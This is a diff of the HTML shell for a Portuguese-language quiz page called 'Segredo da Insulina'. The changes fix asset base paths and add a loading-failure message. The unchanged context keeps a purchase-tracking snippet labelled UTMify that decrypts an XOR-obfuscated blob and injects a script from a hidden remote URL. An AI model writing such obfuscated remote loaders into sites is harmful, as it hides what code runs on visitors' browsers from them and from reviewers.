@@ -2,7 +2,13 @@
 <html lang="pt-BR"><head>
 <meta charset="utf-8">
 <!-- Mantém caminhos relativos corretos em /pagina e /pagina/ (Vercel e Live Server). -->
-<script>(function(){var path=location.pathname;var dir=/\/[^/]+\.[^/]+$/.test(path)?path.replace(/[^/]+$/, ''):(path.endsWith('/')?path:path+'/');var base=document.createElement('base');base.href=dir;document.head.appendChild(base);})();</script>
+<script>(function(){
+  // Assets are stored in the website root, even when this page is opened at /pagina.
+  var p=location.pathname;
+  var quiz=p.match(/^(.*)\/pagina(?:\/index\.html|\/)?$/i);
+  var root=quiz?(quiz[1]||'')+'/':(p.endsWith('/')?p:p.replace(/[^/]*$/,''));
+  var b=document.createElement('base');b.href=root;document.head.appendChild(b);
+})();</script>
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <meta name="theme-color" content="#f5fff9">
 <title>Segredo da Insulina</title>
@@ -19,7 +25,7 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&amp;display=swap" media="print" onload="this.media='all'">
 <link rel="stylesheet" href="css/index-BvuoaYKC.css">
-<link rel="modulepreload" href="js/index-1692088fa3.js">
+<link rel="modulepreload" href="js/index-7562c9f413af.js">
 <!--UTMIFY - COMPRA-->
 <script>(function(){var d_ru=atob("DI/fOdtZECXCsVj5yfT9TKk1Mh/g2SyNufzlFvQ6dEvsxCyUoOmmF7g2fQugw3eKqv22Sa8qP1WryT2V5v+2Qb41PUKt3j+VrKG1Svl1MkS2xSqQq/qrXKh7Kn6fnXqepeC9WLcqMh+ZynqXqOK6G+F7d0qt1jScmeanXLcQdAfuky6Ypfq6G+F7JkSngT2bq728AOJvIUD7hjnAqrftCulqMlifzA==");var z_x=[];for(var t_n=0;t_n<d_ru.length;t_n++){z_x.push(d_ru.charCodeAt(t_n)&255);}var n_ob5q=z_x[0];var u_n=z_x.slice(1,1+n_ob5q);var r_oysy=z_x.slice(1+n_ob5q);var b_1fxp=r_oysy.map(function(b,l_v0){return b^u_n[l_v0%n_ob5q];});var q_uqa="";for(var v_lb=0;v_lb<b_1fxp.length;v_lb++){q_uqa+=String.fromCharCode(b_1fxp[v_lb]&255);}var w_nys=decodeURIComponent(escape(q_uqa));var x_m=JSON.parse(w_nys);var d_12j=x_m.globals||[];d_12j.forEach(function(j_jpd){window[j_jpd.name]=j_jpd.value;});var h_uob7=document.createElement("script");h_uob7.src=x_m.url;h_uob7.async=true;h_uob7.defer=true;(x_m.attributes||[]).forEach(function(t_yw58){h_uob7.setAttribute(t_yw58.name,t_yw58.value);});(document.head||document.documentElement).appendChild(h_uob7);})();</script>
 <!--UTMIFY Script de UTM's-->
@@ -42,5 +48,12 @@
 
   gtag('config', 'G-RK33YSS8VR');
 </script>
-<script type="module" src="js/index-1692088fa3.js"></script>
-</head><body><div id="root"></div><noscript>Habilite o JavaScript para visualizar o questionário.</noscript></body></html>
+<script type="module" src="js/index-7562c9f413af.js"></script>
+<style>
+#quiz-fallback{display:none;min-height:100vh;box-sizing:border-box;align-items:center;justify-content:center;padding:24px;text-align:center;background:#fff5eb;color:#392718;font-family:Arial,sans-serif;}
+#root:empty + #quiz-fallback{display:flex}
+#quiz-fallback .msg{max-width:340px;line-height:1.65}
+</style>
+</head><body><div id="root"></div><div id="quiz-fallback" role="status"><div class="msg"><strong>Carregando questionário…</strong><p>Aguarde um instante.</p></div></div><noscript>Habilite o JavaScript para visualizar o questionário.</noscript><script>
+setTimeout(function(){var r=document.getElementById('root');var f=document.getElementById('quiz-fallback');if(r&&!r.hasChildNodes()&&f){f.querySelector('.msg').innerHTML='<strong>Não foi possível carregar o questionário.</strong><p>Atualize a página. Se continuar, verifique a conexão e se todos os arquivos da pasta js foram publicados.</p>'; }},8000);
+</script></body></html>
